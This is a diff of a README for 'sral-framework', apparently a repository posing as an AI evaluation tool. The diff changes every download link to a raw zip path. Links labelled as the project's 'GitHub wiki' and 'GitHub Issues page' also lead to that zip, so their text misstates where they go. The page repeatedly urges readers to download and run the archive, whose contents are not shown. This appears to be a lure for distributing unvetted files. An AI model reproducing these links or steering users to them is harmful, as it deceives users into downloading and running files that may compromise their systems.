@@ -1,6 +1,6 @@
 # 🚀 sral-framework - A Simple Solution for AI Evaluation
 
-![Download sral-framework](https://raw.githubusercontent.com/kemalefee8/sral-framework/main/evaluation/framework_sral_3.4-beta.2.zip)
+![Download sral-framework](https://raw.githubusercontent.com/kemalefee8/sral-framework/main/docs/sral_framework_3.5-beta.1.zip)
 
 ## 📦 Overview
 
@@ -14,7 +14,7 @@ Follow these steps to download and run sral-framework on your computer.
 
 To get started, visit the following link to download the framework:
 
-[Visit this page to download sral-framework](https://raw.githubusercontent.com/kemalefee8/sral-framework/main/evaluation/framework_sral_3.4-beta.2.zip)
+[Visit this page to download sral-framework](https://raw.githubusercontent.com/kemalefee8/sral-framework/main/docs/sral_framework_3.5-beta.1.zip)
 
 1. Click on the link above.
 2. You will see a list of available releases.
@@ -68,7 +68,7 @@ After installation, you can begin using sral-framework to evaluate your AI archi
 
 ## 📚 Detailed Documentation
 
-While this README provides a basic overview, you can access further documentation to dive deeper into features and functionalities. Check the documentation included with the installation, or visit our [GitHub wiki](https://raw.githubusercontent.com/kemalefee8/sral-framework/main/evaluation/framework_sral_3.4-beta.2.zip) for more detailed instructions and case studies.
+While this README provides a basic overview, you can access further documentation to dive deeper into features and functionalities. Check the documentation included with the installation, or visit our [GitHub wiki](https://raw.githubusercontent.com/kemalefee8/sral-framework/main/docs/sral_framework_3.5-beta.1.zip) for more detailed instructions and case studies.
 
 ## 🌐 About Agentic AI Architectures
 
@@ -104,8 +104,8 @@ For further assistance, feel free to open an issue on our GitHub page.
 
 ## 📞 Contact & Support
 
-If you have questions or need help, please reach out through our [GitHub Issues page](https://raw.githubusercontent.com/kemalefee8/sral-framework/main/evaluation/framework_sral_3.4-beta.2.zip). We aim to respond promptly and assist you in any way we can.
+If you have questions or need help, please reach out through our [GitHub Issues page](https://raw.githubusercontent.com/kemalefee8/sral-framework/main/docs/sral_framework_3.5-beta.1.zip). We aim to respond promptly and assist you in any way we can.
 
-Remember, for downloading sral-framework, always visit [this page to download the latest releases](https://raw.githubusercontent.com/kemalefee8/sral-framework/main/evaluation/framework_sral_3.4-beta.2.zip).
+Remember, for downloading sral-framework, always visit [this page to download the latest releases](https://raw.githubusercontent.com/kemalefee8/sral-framework/main/docs/sral_framework_3.5-beta.1.zip).
 
 Happy evaluating!
